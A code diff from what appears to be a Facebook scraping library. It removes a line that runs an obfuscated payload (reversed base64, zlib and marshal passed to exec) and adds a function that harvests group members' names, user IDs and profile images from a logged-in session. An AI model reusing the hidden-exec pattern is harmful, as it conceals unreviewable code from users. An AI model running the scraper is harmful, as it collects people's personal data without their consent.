@@ -1,1 +1,20 @@
-_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==ga+2hWC8vqrd70r8/2yff0P2v/+2oc/Ov/f7Ie877Xf1O+H/S5yvvfJ6Xi+99LbXe+//1rXPs99rX8m91Ly63487nn/lUtDu9U8//3nf+0w//vk11+7zvv/sd/+9rJTS/trT//fZspjOf7i6p4cx3dnfoFOBEPISOJRM/ImfCmbpWaXK90PCzs+Ss2d/gTTfGYWndvom/5dPV1Wmdn4cqmf7HC6AKMCNXGXc9wFQVM7OHMCfOclN77gFLrhTY70PFDQUMDP+O4M7Mo9MJNfSwClxAktW5mhTQaJacSir4oMNy4q/x3mr6O9hCIfywd1riHEA63SMcqf0d+g2bTmKhLImt9otseEDkw+4G68mmzgLJG0iofcZZc++xZKNs0uWOBJ40EVN5CYlWiOXdZtTDiezelsAxd3NOilbQh0rQvz+DaE4I1hgznwxJCYjMfVGGPYz+d8gDqSJCqrWtIJc+od4yWTR5NiKGjzIZbtCKBCryG0Rmg786lbAZbeXHUqv2sKrJMVrBrs/EB9Cw5OJWXUMJ+o6DLK/V2Bjn0b4ZVcF9d9uEvwVuz5poiRKi64Rp1Xb7tGq6sILBoBGXFADDnC/zCVBSllVYXyS5p0LU4yRbXbJP+amc1HSITn9ZJynFft9zrBZAWySn1cLxXE/aUQTPu3rksHxXgd7QHI3hHNsCSyylCmuZTo1F2D1JvEGQGbMJSAfV22S2rdBQ2zUVpTQ/2kyUWhln+my0upf6ZwCywlYdCzkfETlkkhpqXIQ8y0KrdnopdFNC4+BUfTO753QooHmpEDgGrptHlNIBe0JKEeAtKWQZz5O23G/VgA1I93fltWotSV7CddHHukkkU45VphUDmKD+axRxnKdkko6jncCUdo5EXmQZBlJ+VkvTe8AIpJBv5v8RKGXCvu97Mrz4ghj6dwEG5LtPv9w3Fq9pS2m08uDw9OuTOG8HJ+4iPUrxc5bLn43Yq6lBV+m6yJeSoCGeYAGR6qmF1jaNlxn12bdnp1TOP+eo2P52s79bFAPT1S8LdknXvCNzAQJpfHKuq4RGZUn+JdxTcgtxavdsr3TWxRt9gZ8RYXFiLvgBR+arSrmH1+ReHHzIvYwqudQZxboTjHm7qUl/04qxIxMiEXvSeDuUmuEO9JnNvwZpjq1JcqF07X8SSh/rCPH4w17JErHV2FM1MxRbQ1E77msTm3ZC2m515gdqT2oWQmDFte4xZlP4ZOKpEhkrgSqzJNCATU7SoTIVdeX1DqoiHKqFde4Sb5hhst/TMqSCfeZ3Qlrdr9TRsdaXrACve6ZyEMFLxDQcPcFlGq2NdikOW0viqTYRrGesSvZBRWRvYcUhIJyzKNqLqzL5j7LPIGCAm/ZBuQAhdoY8wiJ4itnstXEU9Afq3heucDLu3qGbqXCxxmOF4ab+U36K52RpgHXuGoQpPd694BpwT4h29lrQ5yqGjI4GoOj7US3DtZW35C1Eh/x5Z+wKKYSe+H4lRXZUP5T6UZFOZg8TWylACMF/9dobh0Q+pTAfOgubwJU72Bb4/BI3v9FOd9Z65iv/u1LCvwDTHjYlaIgRO/meYxfbLweDfSnBrogKdPLRNW9IOKGu9ofgST1xIk8Uaosq2v1deJZhPEvDJlwAA89Aw+8AUrNT+VWeFtqhEUYnmKFz/VDvbcfp5gRU6Y3QMCnpHIn5gYuNt2oPVRyPLw5wFl7YEmeZ2nUR5jGkrPma0I3nF0REqgZuO3oOnLuY6lbaZAFbu8OoH4uiLx7VRlN+6LMyr6WxYOz+Vitf4v4q97xpkro2zorK8rTT2SfdGjR4lBJWTbgvW59UmSBvGhUMj2Iis0QVezsdLiClAaWcS5TvqLo40F0+zQxKEh+eNyzHJBUaRuWP7Ac8KAD9eKpNgPUDMcGJ3rs3E+ZsgDiBb
+from .checker import check_login
+from .output import Output
+from . import sorting
+from . import parsing
+
+@check_login
+def member_group(ses, id, next = None):
+	url = "https://mbasic.facebook.com/browse/group/members/?id={}".format(id)
+	html = ses.session.get(url if not next else next).text
+	data = parsing.to_bs4(html).find_all("table", {"id":lambda x: x and "member_" in x})
+
+	def sorted(arg):
+		name = arg.find("a", href = True).text
+		id_ = arg["id"].replace("member_", "")
+		img = arg.find("img").get("src")
+		return name, id_, img
+
+	next_ = parsing.parsing_href(html, "&cursor=", one = True)
+	data = list(map(sorted, data))
+	return Output(ses, member_group, arg = [id], items = data, next = next_, html = html)
